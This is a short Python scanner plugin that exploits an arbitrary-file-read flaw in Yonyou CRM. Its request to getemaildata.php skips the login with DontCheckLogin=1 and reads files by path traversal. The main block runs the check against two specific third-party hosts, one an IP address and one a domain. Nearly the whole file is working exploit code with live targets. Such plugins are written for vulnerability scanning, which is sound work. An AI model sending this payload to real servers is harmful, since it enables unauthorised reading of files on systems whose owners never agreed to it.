#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:用友CRM系统任意文件读取
#Refer:http://wooyun.org/bugs/wooyun-2015-0137503

def assign(service,arg):
    if service=="yongyou_crm":
        return True,arg 
    
def  audit(arg):
    url=arg+"ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "patch" in res:
        security_hole(url)
    

if __name__=="__main__":
    from dummy import *
    audit(assign('yongyou_crm','http://112.64.196.14/')[1])
    audit(assign('yongyou_crm','http://www.kdlian.com:8001/')[1])